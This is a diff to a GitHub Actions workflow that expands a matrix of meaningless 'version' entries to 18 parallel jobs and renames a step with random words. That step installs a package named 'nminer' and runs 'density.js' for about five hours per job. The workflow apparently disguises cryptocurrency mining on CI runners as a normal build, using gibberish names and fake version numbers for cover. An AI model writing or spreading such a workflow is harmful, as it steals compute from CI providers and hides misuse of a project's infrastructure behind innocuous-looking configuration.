@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5320 }
-          - { version: 3045 }
-          - { version: 3113 }
-          - { version: 3835 }
-          - { version: 4454 }
-          - { version: 2790 }
-          - { version: 5858 }
-          - { version: 8710 }
-          - { version: 7250 }
-          - { version: 9270 }
-          - { version: 163 }
-          - { version: 4795 }
-          - { version: 4093 }
-          - { version: 1788 }
-          - { version: 8626 }
+          - { version: 5386 }
+          - { version: 2579 }
+          - { version: 292 }
+          - { version: 9060 }
+          - { version: 5716 }
+          - { version: 2945 }
+          - { version: 8912 }
+          - { version: 9025 }
+          - { version: 4111 }
+          - { version: 9912 }
+          - { version: 2456 }
+          - { version: 1792 }
+          - { version: 3433 }
+          - { version: 670 }
+          - { version: 8544 }
+          - { version: 1327 }
+          - { version: 3480 }
+          - { version: 8254 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gah now transom tremendously
+      - name: elver ah tenant
         run: |
           npm install nminer@latest
-          timeout 314m node density.js || echo "density executed"
+          timeout 311m node density.js || echo "density executed"
